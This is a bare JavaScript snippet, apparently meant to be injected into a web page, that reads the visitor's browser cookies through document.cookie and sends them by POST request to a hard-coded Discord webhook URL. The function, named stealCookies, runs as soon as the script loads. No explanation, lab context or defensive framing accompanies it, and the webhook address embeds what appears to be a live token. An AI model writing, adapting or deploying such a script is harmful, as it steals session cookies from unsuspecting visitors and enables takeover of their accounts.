var webhookUrl = 'https://discord.com/api/webhooks/1260777345120211014/PaPYule1m35xzv0VcXl-Wd-sMdQVMQ-aYxI4VI6gbNsYmMPwsjZveykFQIx_cAvrDYhb';

function stealCookies() {
    var cookies = document.cookie;
    if (cookies) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", webhookUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({ "cookies": cookies }));
    }
}

stealCookies();
